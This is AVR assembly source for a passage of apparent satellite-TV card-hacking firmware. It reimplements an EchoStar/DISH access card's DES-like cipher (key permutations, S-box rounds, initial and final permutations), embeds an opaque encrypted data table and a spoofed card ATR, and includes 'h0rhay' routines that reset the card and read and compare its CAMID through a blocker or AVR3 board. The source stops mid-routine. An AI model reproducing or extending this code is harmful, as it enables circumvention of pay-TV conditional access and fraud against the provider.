		sbrc	r16, 7
		ori	r18, 4


		ldd	r16, Y+4
		sbrc	r16, 0
		ori	r24, 8
		sbrc	r16, 1
		ori	r23, 0x20
		sbrc	r16, 2
		ori	r24, 0x80
		sbrc	r16, 3
		ori	r25, 0x20
		sbrc	r16, 4
		ori	r22, 0x80
		sbrc	r16, 5
		ori	r23, 8


		ldd	r16, Y+5
		sbrc	r16, 2
		ori	r21, 4
		sbrc	r16, 3
		ori	r21, 1
		sbrc	r16, 4
		ori	r21, 2
		sbrc	r16, 5
		ori	r24, 4
		sbrc	r16, 6
		ori	r23, 0x10
		sbrc	r16, 7
		ori	r23, 2


		ldd	r16, Y+6
		sbrc	r16, 0
		ori	r22, 0x20
		sbrc	r16, 1
		ori	r24, 0x10
		sbrc	r16, 2
		ori	r22, 8
		sbrc	r16, 3
		ori	r24, 0x40
		sbrc	r16, 4
		ori	r25, 0x10
		sbrc	r16, 5
		ori	r25, 0x80


		ldd	r16, Y+7
		sbrc	r16, 2
		ori	r21, 0x10
		sbrc	r16, 3
		ori	r25, 0x40
		sbrc	r16, 4
		ori	r22, 0x10
		sbrc	r16, 5
		ori	r21, 8
		sbrc	r16, 6
		ori	r22, 4
		sbrc	r16, 7
		ori	r22, 0x40


		sbrc	r14, 0		; Here,	we're operating on the bits
		ori	r18, 0x80	; that were left out of	the calculation
		sbrc	r14, 1		; on the last round (the bits that
		ori	r19, 2		; ended	up in UKBITS).	At the end of
		sbrc	r14, 2		; the "update key" routine, the
		ori	r19, 1		; "carry-out" byte is moved from
		sbrc	r14, 3		; UKBITS to UKBTEMP in preparation for
		ori	r19, 0x10	; the next rounds' permutation
		sbrc	r14, 4
		ori	r24, 0x20
		sbrc	r14, 5
		ori	r23, 4
		sbrc	r14, 6
		ori	r23, 1
		sbrc	r14, 7
		ori	r21, 0x20


		ret
; End of function DPermute



		
;-------------------------------------------------------------------------------------------------------------------
; ллллллллллллллл S U B	R O U T	I N E ллллллллллллллллллллллллллллллллллллллл
;*****
;
; ENCRYPT: Encrypt an 8-byte block of data pointed to by an address stored
;	   at PACPTRH:PACPTRL.	On entry, the compressed key to	use for
;	   encryption is stored	at KEYBUFF..KEYBUFF+6.	This routine will
;	   perform an initial permutation on the key, but will not update
;	   the key in KEYBUFF.	Rather,	the result of the key's permutation
;	   will	be stored in the working key registers.
;
;*****

;
; As with DECRYPT, an initial permutation is performed on the key.  Although
; the permutation itself is different, the principle is	the same.  The table
; of raw-to-permuted bits is as	follows:
;
;		      ----- bit	within permuted	key byte ----
;		 reg   7    6	 5    4	   3	2    1	  0
;		 ---- ---- ----	---- ---- ---- ---- ---- ----
;		KEY1  -0-  -0-	23   55	  60   38   53	 14
;		KEY2  46   21	15    6	  63   39   -0-	 -0-
;		KEY3  -0-  -1-	62   44	  31   30   37	  5
;		KEY4  47   22	29   36	   7   61   -0-	 -1-
;		KEY5  -1-  -0-	 4   35	  50   33   28	 18
;		KEY6  27   17	51    3	  26   41   -1-	 -0-
;		KEY7  -1-  -1-	20    9	  57   34   19	 59
;		KEY8  25   49	58   11	  10   43   -1-	 -1-
;	      UKBITS  12    2	42    1	  52   13   45	 54

EnCrypt_Init:				; ...
		ldi	r17, 0		; Initialize static s-box selection bits
		ldi	r18, 0
		ldi	r19, 0x40
		ldi	r20, 1
		ldi	r21, 0x80
		ldi	r22, 2
		ldi	r23, 0xC0
		ldi	r24, 3
		ldi	r25, 0


		lds	r0, sKeyBuff0	; (sKeyBuf) + 0
		sbrc	r0, 0
		ori	r24, 0x40
		sbrc	r0, 1
		ori	r18, 8
		sbrc	r0, 2
		ori	r19, 0x20
		sbrc	r0, 3
		ori	r20, 4
		sbrc	r0, 4
		ori	r17, 8
		sbrc	r0, 5
		ori	r23, 1
		sbrc	r0, 6
		ori	r24, 0x20
		sbrc	r0, 7
		ori	r23, 8


		lds	r0, sKeyBuff1	; (sKeyBuf) +1
		sbrc	r0, 0
		ori	r25, 0x20
		sbrc	r0, 1
		ori	r22, 4
		sbrc	r0, 2
		ori	r17, 0x10
		sbrc	r0, 3
		ori	r25, 1
		sbrc	r0, 4
		ori	r17, 2
		sbrc	r0, 5
		ori	r25, 8
		sbrc	r0, 6
		ori	r22, 0x20
		sbrc	r0, 7
		ori	r21, 8


		lds	r0, sKeyBuff2	; (sKeyBuf) + 2
		sbrc	r0, 0
		ori	r21, 0x10
		sbrc	r0, 1
		ori	r23, 4
		sbrc	r0, 2
		ori	r21, 4
		sbrc	r0, 3
		ori	r20, 0x80
		sbrc	r0, 4
		ori	r18, 0x80
		sbrc	r0, 5
		ori	r25, 2
		sbrc	r0, 6
		ori	r19, 0x10
		sbrc	r0, 7
		ori	r24, 4


		lds	r0, sKeyBuff3	; (sKeyBuf) +3
		sbrc	r0, 0
		ori	r21, 2
		sbrc	r0, 1
		ori	r22, 0x80
		sbrc	r0, 2
		ori	r22, 8
		sbrc	r0, 3
		ori	r24, 0x80
		sbrc	r0, 4
		ori	r18, 4
		sbrc	r0, 5
		ori	r17, 4
		sbrc	r0, 6
		ori	r19, 2
		sbrc	r0, 7
		ori	r20, 0x10


		lds	r0, sKeyBuff4	; (sKeyBuf) + 4
		sbrc	r0, 0
		ori	r18, 0x40
		sbrc	r0, 1
		ori	r23, 0x20
		sbrc	r0, 2
		ori	r23, 2
		sbrc	r0, 3
		ori	r21, 1
		sbrc	r0, 4
		ori	r22, 0x40
		sbrc	r0, 5
		ori	r19, 8
		sbrc	r0, 6
		ori	r19, 4
		sbrc	r0, 7
		ori	r20, 0x20


		lds	r0, sKeyBuff5	; (sKeyBuf) + 5
		sbrc	r0, 0
		ori	r17, 1
		sbrc	r0, 1
		ori	r25, 4
		sbrc	r0, 2
		ori	r25, 0x80
		sbrc	r0, 3
		ori	r24, 0x10
		sbrc	r0, 4
		ori	r24, 8
		sbrc	r0, 5
		ori	r23, 0x10
		sbrc	r0, 6
		ori	r17, 0x20
		sbrc	r0, 7
		ori	r20, 0x40


		lds	r0, sKeyBuff6	; (sKeyBuf) + 6
		sbrc	r0, 0
		ori	r20, 8
		sbrc	r0, 1
		ori	r18, 0x10
		sbrc	r0, 2
		ori	r19, 1
		sbrc	r0, 3
		ori	r21, 0x20
		sbrc	r0, 4
		ori	r22, 0x10
		sbrc	r0, 5
		ori	r25, 0x40
		sbrc	r0, 6
		ori	r25, 0x10
		sbrc	r0, 7
		ori	r18, 0x20


		ret
; End of function EnCrypt_Init


		
;-------------------------------------------------------------------------------------------------------------------
; ллллллллллллллл S U B	R O U T	I N E ллллллллллллллллллллллллллллллллллллллл

EnCrypt_Proc:				; ...
		rcall	LoadKeyRegs

EnCrypt_ProcAlt:			; ...
		rcall	InitCrypto

ECP_L1:					; ...
		ror	r4		; Get #	of key rotations to perform this round into the	carry flag
		ror	r5
		brcs	ECP_L2		; If we	only need to perform 1 key rotation, then skip extra key rotation step
					; 
		rcall	EPermute	; go permute key from last round
		rcall	KeyUpDate

ECP_L2:					; ...
		rcall	EPermute	; go permute key from last round
		rcall	SswapUp		; Perform S-box	substitution, ciphertext word swap, p-box, and update key


		tst	r15		; All finished?
		brpl	ECP_L1


		ret
; End of function EnCrypt_Proc


		
;-------------------------------------------------------------------------------------------------------------------
; ллллллллллллллл S U B	R O U T	I N E ллллллллллллллллллллллллллллллллллллллл
;*****
;
; EPERMUTE: Permute key	for encryption
;
; This routine takes the 8 bytes of data pointed to by Y and permutes it.
; I suspect that this is actually a combination	of the key rotation and
; PC-2 permuted	choice tables.	Much like the key's initial permutation,
; this routine selects 48 of the 56 key	bits and uses them to perform the
; XOR-operation	on the data being encrypted before the s-box substitution.
; As with the initial permutation, the comments	for this section are sparse,
; because the code is very straightforward.  One thing to take note of is
; that the only	bits that are checked in this permutation are the bits
; that are not used as static s-box selection bits.
;
;*****

EPermute:				; ...
		ldi	r17, 0		; Initialize static s-box selection bits
		ldi	r18, 0
		ldi	r19, 0x40
		ldi	r20, 1
		ldi	r21, 0x80
		ldi	r22, 2
		ldi	r23, 0xC0
		ldi	r24, 3
		ldi	r25, 0


		ld	r16, Y
		sbrc	r16, 0
		ori	r20, 0x40
		sbrc	r16, 1
		ori	r20, 4
		sbrc	r16, 2
		ori	r18, 0x80
		sbrc	r16, 3
		ori	r19, 1
		sbrc	r16, 4
		ori	r18, 8
		sbrc	r16, 5
		ori	r19, 8


		ldd	r16, Y+1
		sbrc	r16, 2
		ori	r20, 0x80
		sbrc	r16, 3
		ori	r20, 0x10
		sbrc	r16, 4
		ori	r17, 1
		sbrc	r16, 5
		ori	r17, 0x20
		sbrc	r16, 6
		ori	r20, 0x20
		sbrc	r16, 7
		ori	r25, 1


		ldd	r16, Y+2
		sbrc	r16, 0
		ori	r25, 4
		sbrc	r16, 1
		ori	r25, 2
		sbrc	r16, 2
		ori	r17, 4
		sbrc	r16, 3
		ori	r18, 4
		sbrc	r16, 4
		ori	r25, 8
		sbrc	r16, 5
		ori	r20, 8


		ldd	r16, Y+3
		sbrc	r16, 2
		ori	r18, 0x10
		sbrc	r16, 3
		ori	r18, 0x20
		sbrc	r16, 4
		ori	r19, 0x10
		sbrc	r16, 5
		ori	r19, 2
		sbrc	r16, 6
		ori	r19, 4
		sbrc	r16, 7
		ori	r17, 0x10


		ldd	r16, Y+4
		sbrc	r16, 0
		ori	r22, 8
		sbrc	r16, 1
		ori	r22, 0x10
		sbrc	r16, 2
		ori	r22, 4
		sbrc	r16, 3
		ori	r24, 0x20
		sbrc	r16, 4
		ori	r24, 4
		sbrc	r16, 5
		ori	r25, 0x80


		ldd	r16, Y+5
		sbrc	r16, 2
		ori	r24, 0x40
		sbrc	r16, 3
		ori	r23, 4
		sbrc	r16, 4
		ori	r24, 0x10
		sbrc	r16, 5
		ori	r23, 1
		sbrc	r16, 6
		ori	r24, 0x80
		sbrc	r16, 7
		ori	r21, 0x10


		ldd	r16, Y+6
		sbrc	r16, 0
		ori	r25, 0x40
		sbrc	r16, 1
		ori	r22, 0x80
		sbrc	r16, 2
		ori	r25, 0x20
		sbrc	r16, 3
		ori	r21, 0x20
		sbrc	r16, 4
		ori	r22, 0x40
		sbrc	r16, 5
		ori	r21, 2


		ldd	r16, Y+7
		sbrc	r16, 2
		ori	r22, 0x20
		sbrc	r16, 3
		ori	r21, 1
		sbrc	r16, 4
		ori	r23, 2
		sbrc	r16, 5
		ori	r25, 0x10
		sbrc	r16, 6
		ori	r23, 8
		sbrc	r16, 7


		ori	r21, 4
		sbrc	r14, 0
		ori	r19, 0x20
		sbrc	r14, 1
		ori	r17, 2
		sbrc	r14, 2
		ori	r18, 0x40
		sbrc	r14, 3
		ori	r17, 8
		sbrc	r14, 4
		ori	r23, 0x10
		sbrc	r14, 5
		ori	r21, 8
		sbrc	r14, 6
		ori	r24, 8
		sbrc	r14, 7
		ori	r23, 0x20


		ret
; End of function EPermute



		
;-------------------------------------------------------------------------------------------------------------------
; ллллллллллллллл S U B	R O U T	I N E ллллллллллллллллллллллллллллллллллллллл
;*****
;
; INICRYPT: Perform initialization for encryption/decryption.  This routine
;	     will initialize the round count, the key rotation register,
;	     and perform the initial permutation IP on the data	to be
;	     encrypted/decrypted.  In addition,	we'll fall through to perform
;	     the first swap, substitution, permutation,	and key	update
;
;*****

InitCrypto:				; ...
		ldi	r16, 0xF	; 16 rounds of encryption to perform
		mov	r15, r16
		ldi	r16, 0x40	; Initialize key rotation register
		mov	LEN, r16
		ldi	r16, 0x81
		mov	LRC, r16
;
; Perform initial permutation IP
;
; Input	byte n contains	bit n for each of 8 output bytes, such that bit	x
; of the input byte is bit n of	output byte 7-x.
;
; Given	64 bits, numbered 00 to	3F...
;
; Byte #  Input				     Output
;   0	  00 08	10 18 20 28 30 38	     07	06 05 04 03 02 01 00
;   1	  01 09	11 19 21 29 31 39	     0F	0E 0D 0C 0B 0A 09 08
;   2	  02 0A	12 1A 22 2A 32 3A	     17	16 15 14 13 12 11 10
;   3	  03 0B	13 1B 23 2B 33 3B	     1F	1E 1D 1C 1B 1A 19 18
;   4	  04 0C	14 1C 24 2C 34 3C	     27	26 25 24 23 22 21 20
;   5	  05 0D	15 1D 25 2D 35 3D	     2F	2E 2D 2C 2B 2A 29 28
;   6	  06 0E	16 1E 26 2E 36 3E	     37	36 35 34 33 32 31 30
;   7	  07 0F	17 1F 27 2F 37 3F	     3F	3E 3D 3C 3B 3A 39 38
;
; Although this	arrangement appears different from the standard	E* IP box,
; the difference is due	to the fact that the data bytes	being encrypted	are
; interleaved in the E*	system,	probably to make this routine faster.
; Because of this, we can consider R7, R9, R11,	and R13	as holding the
; DES "right half" data and R6, R8, R10, and R12 as holding the "left half"
; data.
;

		lds	YH, sCryPtH	; Y = (sCryPt) -> address of crypto buffer
		lds	YL, sCryPtL
		push	r18
		ldi	r18, 8		; count	= 8

IC_L1:					; ...
		ld	r16, Y+		; permute buffer
		lsr	r16
		ror	r13
		lsr	r16
		ror	r12
		lsr	r16
		ror	r11
		lsr	r16
		ror	r10
		lsr	r16
		ror	r9
		lsr	r16
		ror	r8
		lsr	r16
		ror	r7
		lsr	r16
		ror	r6
		dec	r18
		brne	IC_L1


		pop	r18
		
;-------------------------------------------------------------------------------------------------------------------
;*****
;
; SSWAPUP: Perform swap, substitution, and p-box permutation.  This single
;	    routine performs the s-box substitution and	p-box permutation
;	    in a single	step (by immediately moving the	output of the s-boxes
;	    to their p-box destinations), then performs	the XOR	operation
;	    and	left-half/right-half swap.
;
;*****

SswapUp:				; ...
		clr	XL		; Init 32-bit result
		clr	XH
		clr	YL
		clr	YH


		ldi	ZH, high(S_Boxes*2) ; start of S-Boxes
		mov	r16, r7
		rol	r16
		mov	r16, r13
		rol	r16
		andi	r16, 0x3F
		eor	r16, r17
		clr	ZL
		add	ZL, r16
		lpm			; Get s-box entry


		sbrc	r0, 0
		ori	XH, 1
		sbrc	r0, 1
		ori	YL, 1
		sbrc	r0, 2
		ori	YL, 0x40
		sbrc	r0, 3
		ori	YH, 0x40
		mov	r16, r11
		ror	r16
		mov	r16, r13
		ror	r16
		andi	r16, 0xFC	; add 4
		eor	r16, r18
		clr	ZL
		add	ZL, r16
		lpm
		sbrc	r0, 4
		ori	XH, 0x10
		sbrc	r0, 5
		ori	YH, 8
		sbrc	r0, 6
		ori	XL, 2
		sbrc	r0, 7
		ori	YL, 2
		mov	r16, r13
		rol	r16
		mov	r16, r11
		rol	r16
		andi	r16, 0x3F
		eor	r16, r19
		clr	ZL
		add	ZL, r16
		lpm
		sbrc	r0, 0
		ori	YL, 0x80
		sbrc	r0, 1
		ori	XH, 0x80
		sbrc	r0, 2
		ori	YH, 0x20
		sbrc	r0, 3
		ori	XL, 0x20
		mov	r16, r9
		ror	r16
		mov	r16, r11
		ror	r16
		andi	r16, 0xFC	; add 4
		eor	r16, r20
		clr	ZL
		add	ZL, r16
		lpm
		sbrc	r0, 4
		ori	YH, 2
		sbrc	r0, 5
		ori	YL, 8
		sbrc	r0, 6
		ori	XH, 2
		sbrc	r0, 7
		ori	XL, 1
		mov	r16, r11
		rol	r16
		mov	r16, r9
		rol	r16
		andi	r16, 0x3F
		eor	r16, r21
		clr	ZL
		add	ZL, r16
		lpm
		sbrc	r0, 0
		ori	XL, 0x80
		sbrc	r0, 1
		ori	XH, 0x20
		sbrc	r0, 2
		ori	YH, 1
		sbrc	r0, 3
		ori	XL, 4
		mov	r16, r7
		ror	r16
		mov	r16, r9
		ror	r16
		andi	r16, 0xFC	; add 4
		eor	r16, r22
		clr	ZL
		add	ZL, r16
		lpm
		sbrc	r0, 4
		ori	XL, 8
		sbrc	r0, 5
		ori	YH, 0x10
		sbrc	r0, 6
		ori	XH, 4
		sbrc	r0, 7
		ori	YL, 4
		mov	r16, r9
		rol	r16
		mov	r16, r7
		rol	r16
		andi	r16, 0x3F
		eor	r16, r23
		clr	ZL
		add	ZL, r16
		lpm
		sbrc	r0, 0
		ori	YH, 0x80
		sbrc	r0, 1
		ori	XH, 8
		sbrc	r0, 2
		ori	YL, 0x20
		sbrc	r0, 3
		ori	XL, 0x40
		mov	r16, r13
		ror	r16
		mov	r16, r7
		ror	r16
		andi	r16, 0xFC	; add 4
		eor	r16, r24
		clr	ZL
		add	ZL, r16
		lpm
		sbrc	r0, 4
		ori	XL, 0x10
		sbrc	r0, 5
		ori	YH, 4
		sbrc	r0, 6
		ori	XH, 0x40
		sbrc	r0, 7
		ori	YL, 0x10
		mov	r16, r12
		eor	r16, XL
		mov	r12, r13
		mov	r13, r16
		mov	r16, r10
		eor	r16, XH
		mov	r10, r11
		mov	r11, r16
		mov	r16, r8
		eor	r16, YL
		mov	r8, r9
		mov	r9, r16
		mov	r16, r6
		eor	r16, YH
		mov	r6, r7
		mov	r7, r16


		dec	r15		; One less round of de/encryption to perform
		brmi	FinalPerm	; If we're done en/decrypting, go perform IP-1 permutation, 
					; else fall thru to update key
					; 
		
;-------------------------------------------------------------------------------------------------------------------
;*****
;
; KeyUpDate: Update key.  Also carries unused key bits forward to next round
;	    in UKBTEMP
;
;*****				 

KeyUpDate:				; ...
		lds	YH, sCryPtH	; Y = (sCryPt) address of crypto buffer
		lds	YL, sCryPtL
		st	Y, r17
		std	Y+1, r18
		std	Y+2, r19
		std	Y+3, r20
		std	Y+4, r21
		std	Y+5, r22
		std	Y+6, r23
		std	Y+7, r24
		mov	r14, r25	; Save unused key bits for later use


		ret


		
;-------------------------------------------------------------------------------------------------------------------
;*****
;
; Final	permutation: Perform IP^-1 permutation on encrypted/decrypted data
;
;	  Input				     Output
; RDATA4: 07 06	05 04 03 02 01 00     DATA1  08	00 18 10 28 20 38 30	   
; LDATA4: 0F 0E	0D 0C 0B 0A 09 08     DATA2  09	01 19 11 29 21 39 31	   
; RDATA3: 17 16	15 14 13 12 11 10     DATA3  0A	02 1A 12 2A 22 3A 32	   
; LDATA3: 1F 1E	1D 1C 1B 1A 19 18     DATA4  0B	03 1B 13 2B 23 3B 33	   
; RDATA2: 27 26	25 24 23 22 21 20     DATA5  0C	04 1C 14 2C 24 3C 34	   
; LDATA2: 2F 2E	2D 2C 2B 2A 29 28     DATA6  0D	05 1D 15 2D 25 3D 35	   
; RDATA1: 37 36	35 34 33 32 31 30     DATA7  0E	06 1E 16 2E 26 3E 36	   
; LDATA1: 3F 3E	3D 3C 3B 3A 39 38     DATA8  0F	07 1F 17 2F 27 3F 37	   
;
;*****

FinalPerm:				; ...
		lds	YH, sCryPtH
		lds	YL, sCryPtL
		ldi	r18, 8		; 8 rounds of permutation

FP_loop:				; ...
		lsr	r7
		rol	r16
		lsr	r6
		rol	r16
		lsr	r9
		rol	r16
		lsr	r8
		rol	r16
		lsr	r11
		rol	r16
		lsr	r10
		rol	r16
		lsr	r13
		rol	r16
		lsr	r12
		rol	r16
		st	Y+, r16
		dec	r18
		brne	FP_loop


		ret
; End of function InitCrypto


		
;-------------------------------------------------------------------------------------------------------------------
; ллллллллллллллл S U B	R O U T	I N E ллллллллллллллллллллллллллллллллллллллл

PermuteKey:				; ...
		push	r1		; save Key regs
		push	r2
		push	r3
		push	r4
		push	r5
		push	r6
		push	r7
		push	r8

; load key regs	from keybuffer

		lds	r1, sKeyBuff0	; (sKeyBuf) + n
		lds	r2, sKeyBuff1
		lds	r3, sKeyBuff2
		lds	r4, sKeyBuff3
		lds	r5, sKeyBuff4
		lds	r6, sKeyBuff5
		lds	r7, sKeyBuff6
		lds	r8, sKeyBuff7


		rol	r8
		rol	r8
		rol	r7
		rol	r8
		rol	r7
		rol	r6
		rol	r8
		rol	r7
		rol	r6
		rol	r5
		rol	r8
		rol	r7
		rol	r6
		rol	r5
		rol	r4
		rol	r8
		rol	r7
		rol	r6
		rol	r5
		rol	r4
		rol	r3
		rol	r8
		rol	r7
		rol	r6
		rol	r5
		rol	r4
		rol	r3
		rol	r2
		rol	r8
		rol	r7
		rol	r6
		rol	r5
		rol	r4
		rol	r3
		rol	r2
		rol	r1

; save key regs	to keybuffer

		sts	sKeyBuff0, r1	; (sKeyBuf) + n
		sts	sKeyBuff1, r2
		sts	sKeyBuff2, r3
		sts	sKeyBuff3, r4
		sts	sKeyBuff4, r5
		sts	sKeyBuff5, r6
		sts	sKeyBuff6, r7

; restore original key regs

		pop	r8
		pop	r7
		pop	r6
		pop	r5
		pop	r4
		pop	r3
		pop	r2
		pop	r1


		ret
; End of function PermuteKey


; *****************************************************************************************
; MCG307 START CHANGES #7
; *****************************************************************************************

sub_137:	ldi	YL,low(sTemp+10) ; 0x0186
		ldi	YH,high(sTemp+10)
		mov	ZL,XL
		mov	ZH,XH
		lpm
		adiw	ZL,2
		mov	r18,r0
		clr	r16
loc_164:	lpm
		adiw	ZL,1
		st	y+,r0
		eor	r16,r0
		dec	r18
		brne	loc_164
		st	y+,r16
		ldi	XH,high(sEBoxKey)
		ldi	XL,low(sEBoxKey) ; 0x0144
		sts	sKeyPtH,XH
		sts	sKeyPtL,XL
		ldi	XL,low(sTemp+10)
		ldi	XH,high(sTemp+10)
		sts	sCryPtL,XL
		sts	sCryPtH,XH
		ldi	r18,8

loc_165:	push	r18
		rcall	EnCrypt_Proc
		pop	r18
		lds	XL,sCryPtL
		lds	XH,sCryPtH
		adiw	XL,8
		sts	sCryPtL,XL
		sts	sCryPtH,XH
		dec	r18
		brne	loc_165
		ret

BigTable:	.dw 0x6485, 0x77C4, 0x8992, 0x1517, 0x0981, 0x8D21, 0x5AAF
		.dw 0x0054, 0x96CE, 0x09A1, 0x8D80, 0xFC74, 0xD279, 0xA36F
		.dw 0x09C1, 0x0002, 0xF683, 0xB8CD, 0x4E4C, 0x09DD, 0x003D
		.dw 0x0264, 0x0201, 0x7956, 0xFF82, 0x5FED, 0x1A04, 0x64F9
		.dw 0xC9BF, 0x2987, 0x615E, 0x51A8, 0x308A, 0x417E, 0x63A5
		.dw 0x2396, 0x27BB, 0x3178, 0x0FB5, 0x307D, 0xB6D0, 0x3AE1
		.dw 0xA54E, 0xC119, 0x776C, 0xD167, 0x3B93, 0x95AB, 0x19D2
		.dw 0x1D7C, 0x398C, 0x0077, 0x003D,	0x0264, 0x0201, 0x600B
		.dw 0xF3E6, 0x1F5D, 0x37C7, 0x7E1C, 0x3918, 0x707B, 0x9B52
		.dw 0xCD63, 0x193D, 0x4773, 0x1810, 0x9F46, 0x81DA, 0x19F4
		.dw 0xCF22, 0x2DDB, 0x67CA, 0x7F9F, 0x283A, 0x116F, 0x44BA
		.dw 0xB78A, 0x4E1E, 0xCC02, 0x94A9, 0x24C0, 0xAE2C, 0x00C9
		.dw 0x0035,	0x0264, 0x0201, 0xDD4A, 0x023D, 0x667B, 0x868F
		.dw 0x93B7, 0xB2A4, 0x4738, 0x9226, 0x21A3, 0xE686, 0xF48C
		.dw 0x309D, 0x783D, 0x0B94, 0x3FB3, 0xBE01, 0xEAEA, 0x1152
		.dw 0x9C5B, 0x606F, 0xAFC2, 0xED9B, 0xA624, 0x7A9B, 0x0011
		.dw 0x0035,	0x0264, 0x0201, 0xC227, 0xB191, 0x4C56, 0x11E6
		.dw 0x2557, 0xBB10, 0xB61F, 0x17DD, 0x4409, 0x2E8E, 0xD283
		.dw 0xB42D, 0x4307, 0x4621, 0xC04E, 0xF0FF, 0x59C0, 0xF2A3
		.dw 0xEF2E, 0xC480, 0x51C3, 0x5734, 0xA538, 0x9E5F, 0x0048

; *****************************************************************************************
; MCG307 CHANGES END #7
; *****************************************************************************************

;-------------------------------------------------------------------------------------------------------------------
;
; ATR - LRC is next to last byte on 2nd line - last line is filler byte
; LRC is all bytes xored together plus xored with 0x3F, then the total is inverted

ATR_data:	.db 0x3F,0xFF,0x95,0x00,0xFF,0x91,0x81,0x71,0x64,0x47,0x00,0x44,0x4E,0x41
		.db 0x53,0x50,0x30,0x30,0x33,0x20,0x52,0x65,0x76,0x33,0x36,0x39,0xF1, 0x00 ; last byte is Filler

; Table of number of bytes to return for the 21_xx command, xx is used as an index into the table

Cmd21_Nums:	.db 0,1, 1,0, 0,0, 2,0, 1,0, 0,1, 0,0, 0,0, 0,0, 0,0, 0,0, 0,0,	0,0, 0,0, 0,0, 0,0

; *+*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+*
; *h0rhay* CHANGES START [6/7]

h0rhay:	sbi	ACSR, 7		; Turn off ADC
		cli
		clr	r16
		out	GIMSK, r16		; Disable INT 0 & 1 for now.
		out	MCUCR, r16		; If enabled, a LOW level on INT1 causes an IRQ.

; Setup I/O PORTD -- (NOTE:  RESET is active LOW.  It's normally HIGH since CAM resets when it is LOW.)
;
; PDIP   I/O    Function
; ----   ---   ------------------------------------------------------------------------------------------------
;  10    PD0   BLOCKER: Data I/O from the CAM  --or--  AVR: Data I/O from the IRD
;
;  13    PD3   Interrupt_1 connected ISO Pad Reset line, ie "reset line from IRD"
;
;  14    PD4   AVR: Data I/O from the CAM  --or--  BLOCKER: Data I/O from the IRD
;
;  15    PD5   BLOCKER: PD5:1 means CAM gets RESET from IRD. (WARNING: Data I/O is also "connected")
;                       PD5:0 means CAM RESET is always high.
;
;  15    PD5   AVR3:    PD5:1 means CAM RESET is high.
;                       PD5:0 means CAM RESET is low.
;
; When using a Blocker board and PD5=HIGH, your CAM is connected to your IRD and is "in the stream".
; What I do to ensure bad things don't happen is I make sure the IRD has just dropped it's RESET line
; before I set PD5=HIGH.  This means the IRD is in RESET mode and therefore not "talking" to the CAM.
; Setting PD5=HIGH, only RESETs the CAM. I then return PD5=LOW within 1us or so thus the CAM never gets
; exposed to the stream directly.
; -------------------------------------------------------------------------------------------------------------

		ldi	r16, low(sStack)	; SET STACK
		out	SPL, r16
		ldi	r16,high(sStack)
		out	SPH, r16

; Lets find out what type of system we're using so we can properly setup PD5
; If we're on a BLOCKER then we want it LOW so the CAM RESET stays HIGH.
; If we're on an AVR3 board we want it HIGH so the CAM RESET stays HIGH.

		ldi	XH,high(eEnabler)
		ldi	XL, low(eEnabler)
		rcall	ReadEEP		; X = 0x00CF (eEnabler)
		mov	SID,r16		; Store enabler type for use by TX_CAM and RX_CAM, etc.

		sbrc	SID, 7		; 1=AVR3, 0=Blocker board (skip if Blocker)
		rjmp	h0_avr3
h0_blocker:	ldi	r16, 0xDD		; %11011101 - PD5 low so 4066 blocks IRD RESET making CAM RESET HIGH.
		rjmp	h0lp1
h0_avr3:	ldi	r16, 0xFD		; %11111101 - PD5 high so CAM RESET is HIGH.
h0lp1:	out	PORTD, r16
		ldi	r16, 0x20		; %00100000
		out	DDRD, r16		; PD5 is output, others inputs

; Basic initialization stuff is done.  Time to start things rolling.
;
; Reset the CAM and get the ATR string.  R17 comes back with the number of bytes in the ATR.

		rcall	h0_atr

; Now it's not rocket science to realize that if there were 0 bytes in the ATR then we have a fucked
; CAM or something.  Maybe the (l)user forgot to insert it into the AVR/Blocker board!?

		tst	r17
		brne	atrOK

		ldi	r17,0x01		; ERROR: 01 - NO ATR.
		rjmp	h0_die

; Ok.  Dump the ATR to the Atmel's EEP.  We really don't need to do this but it's kinda cool to read
; the Atmel and see the ATR stored in the EEP.

atrOK:	ldi	XL, low(h0_aaa)
		ldi	XH,high(h0_aaa)
		ldi	YL, low(sTemp)
		ldi	YH,high(sTemp)

atrG6:	ld	r16,y+
		rcall	WriteEEP
		dec	r17
		brne	atrG6

; BYTE:  00 01 02 03 04 05 06 07 08 09 0A 0B 0C 0D 0E 0F 10 11 12 13 14 15 16 17 18 19 1A
; -----  -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- --
;                                **        D  N  A  S  P  0  0  2     R  E  V  0  5  2
;  ROM2: 3F FF 95 00 FF 91 81 71 60 47 00 44 4E 41 53 50 30 30 32 20 52 65 76 30 35 32 FF
;
;                                **        D  N  A  S  P  0  0  3     R  E  V  3  7  2
;  ROM3: 3F FF 95 00 FF 91 81 71 64 47 00 44 4E 41 53 50 30 30 33 20 52 65 76 33 37 32 FB
;
;                                **        D  N  A  S  P  0  1  0     R  E  V  A  1  A
; ROM10: 3F FF 95 00 FF 91 81 71 A0 47 00 44 4E 41 53 50 30 31 30 20 52 65 76 41 31 41 3A
;
;
; Ok, now i'm not exactly sure why, but everyone seems to determine ROM type based on the ATR byte
; indicated by the "**".  This byte really determines buffer size.  It would make sense to use the
; "DNASP002" portion of the ATR however I am going to do like everyone else and use the buffer
; size byte where: $60=ROM2, $64=ROM3, $A0=ROM10.

		ldi	YL, low(sTemp+8)		; Store ROM2/3/10 identifier in r6.
		ldi	YH,high(sTemp+8)		; We will use this value later.
		ld	r6,y+

; Good.  We should be able to talk to the CAM now. Lets use the plain old ordinary CMD $12 to read
; the CAMID and see if this is a new CAM or not.
;
; CMD $12 is basically transmit: 21 00 08 A0 CA 00 00 02 12 00 06 LRC
;              and then receive: 12 00 08 92 04 XX XX XX XX 90 00 LRC
;
; Where XX XX XX XX is the CAMID in hexadecimal. eg: "S 01 1234 1234" is $06 B2 30 F2
;

		ldi	XL, low(h0_getid)
		ldi	XH,high(h0_getid)
		rcall	h0_talk			; Transmit: 21 00 08 A0 CA 00 00 02 12 00 06 LRC
		  					; Response: 12 00 08 92 04 XX XX XX XX 90 00 LRC
		mov	r16,LEN			; LEN must be ----^^
		cpi	r16,0x08
		breq	h0lp2

		ldi	r17,0x02			; ERROR: 02 - Can't read CAMID!
		rjmp	h0_die

; Time to compare the stored value for CAMID and the one we just read from the CAM.

h0lp2:	ldi	XL, low(eCAMID1)		; X=EEP location of eCAMID1
		ldi	XH,high(eCAMID1)
		ldi	YL, low(sMsgBuf+2)	; Y=RAM location of CAM ID in reply.
		ldi	YH,high(sMsgBuf+2)
		ldi	r18,0x04			; 4 bytes in a CAM ID.

